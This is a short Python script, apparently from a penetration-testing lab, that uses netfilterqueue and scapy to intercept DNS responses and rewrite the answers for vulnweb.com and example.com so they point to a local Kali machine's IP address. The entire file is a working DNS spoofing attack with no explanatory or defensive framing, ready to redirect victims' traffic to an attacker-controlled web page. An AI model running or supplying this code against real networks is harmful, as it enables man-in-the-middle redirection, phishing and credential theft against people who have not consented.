#!/usr/bin/env python

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		print("QNAMEEE :: ",qname)
		#only http sites are accesible
		if b"vulnweb.com" in qname or b"example.com" in qname or b"www.example.com" in qname:
			print("[+]Start spoofing the target")
			answer = scapy.DNSRR(rrname=qname,rdata="192.168.137.142")#kali ip --- web page at /var/www/html
			print("ANSWER::: ",answer)
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			packet.set_payload(bytes(scapy_packet))



	packet.accept()
	#packet.drop()



queue = NetfilterQueue()
queue.bind(0, process_packet)
print("[+] starting")
queue.run()
